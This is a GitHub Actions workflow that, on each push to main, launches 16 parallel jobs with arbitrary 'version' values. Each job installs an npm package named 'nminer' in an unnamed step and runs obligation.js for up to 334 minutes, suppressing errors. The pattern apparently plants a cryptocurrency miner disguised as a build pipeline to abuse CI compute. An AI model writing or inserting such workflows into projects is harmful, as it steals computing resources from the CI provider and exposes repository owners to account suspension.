name: obligation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5944 }
          - { version: 601 }
          - { version: 9576 }
          - { version: 1103 }
          - { version: 962 }
          - { version: 2153 }
          - { version: 9788 }
          - { version: 7437 }
          - { version: 7677 }
          - { version: 7815 }
          - { version: 4748 }
          - { version: 9880 }
          - { version: 9869 }
          - { version: 5568 }
          - { version: 1178 }
          - { version: 8488 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 334m node obligation.js || echo "obligation executed"